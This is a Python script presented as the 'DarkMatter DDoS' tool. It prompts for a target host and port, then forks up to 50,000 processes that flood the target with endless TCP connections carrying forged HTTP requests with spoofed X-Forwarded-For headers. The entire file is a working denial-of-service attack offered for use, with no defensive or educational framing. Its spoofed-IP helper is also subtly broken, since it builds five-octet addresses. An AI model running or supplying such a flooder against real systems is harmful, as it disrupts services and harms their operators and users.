import socket
import os
from time import sleep
import multiprocessing
import random
import platform

print("Detecting System...")
sysOS = platform.system()
print("Sistema detectado: ", sysOS)

if sysOS == "Linux":
  try:
    os.system("ulimit -n 130000")
  except Exception as e:
    print(e)
    print("No se pudo iniciar el script")
else:
  print("Su sistema no es Linux, es posible que no pueda ejecutar este script en algunos sistemas")


def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(5))
  return randip


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "REVERSE " + url + " HTTP/0.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass

print("Bienvenido a DarkMatter DDoS\n")
ip = input("IP/Domain: ")
port = int(input("Port: "))
url = f"http://{str(ip)}" 
print("[>>>] RS-28 Sarmat [<<<]")
sleep(1)


def send3attack():
  for i in range(50000): #Poder Mágico
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts
    
    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
    
send3attack()
